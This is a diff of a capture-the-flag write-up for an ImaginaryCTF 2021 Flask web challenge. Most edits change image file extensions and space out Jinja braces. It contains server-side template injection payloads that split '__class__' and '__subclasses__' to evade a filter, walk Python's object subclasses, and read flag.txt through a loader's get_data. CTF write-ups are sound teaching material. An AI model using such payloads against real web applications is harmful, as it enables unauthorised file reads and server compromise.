@@ -273,11 +273,11 @@ To detect this vulnerability I checked the following payload since it is a Flask
 
 
 <p align="left">
-  <img src="/images/writeups/ImaginaryCTF2021/Web/1_template.jpg" width="40%"/>
+  <img src="/images/writeups/ImaginaryCTF2021/Web/1_template.png" width="40%"/>
 </p>
 
 <p align="right">
-  <img src="/images/writeups/ImaginaryCTF2021/Web/2_execution.jpg" width="40%"/>
+  <img src="/images/writeups/ImaginaryCTF2021/Web/2_execution.png" width="40%"/>
 </p>
 
 As we can see, the code is executed, therefore we can try to explote this vulnerability.
@@ -294,7 +294,7 @@ We use an empty string ("") and access its class attribute. We have some issues 
 Now, step up to the MRO:
 
 <p align="center">
-  <img src="/images/writeups/ImaginaryCTF2021/Web/3_class.jpg" width="70%"/>
+  <img src="/images/writeups/ImaginaryCTF2021/Web/3_class.png" width="70%"/>
 </p>
 
 ```
@@ -304,19 +304,19 @@ Now, step up to the MRO:
 ```
 
 <p align="center">
-  <img src="/images/writeups/ImaginaryCTF2021/Web/4_mro.jpg" width="70%"/>
+  <img src="/images/writeups/ImaginaryCTF2021/Web/4_mro.png" width="70%"/>
 </p>
 
 Now I use subclasses over the object class to obtain the list of available methods for the object class:
 
 ```
 
-{{""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()}}
+{ {""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()} }
 
 ```
 
 <p align="center">
-  <img src="/images/writeups/ImaginaryCTF2021/Web/5_subclasses.jpg" width="70%"/>
+  <img src="/images/writeups/ImaginaryCTF2021/Web/5_subclasses.png" width="70%"/>
 </p>
 
 
@@ -376,7 +376,7 @@ Following the documentation, we crafted the following payload:
 
 ```
 
-{{""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()[99]("flag.txt", "flag.txt").get_data("flag.txt")}}
+{ {""["__cl" + "ass__"].__mro__[1]["__subcl" + "asses__"]()[99]("flag.txt", "flag.txt").get_data("flag.txt")} }
 
 ```
 
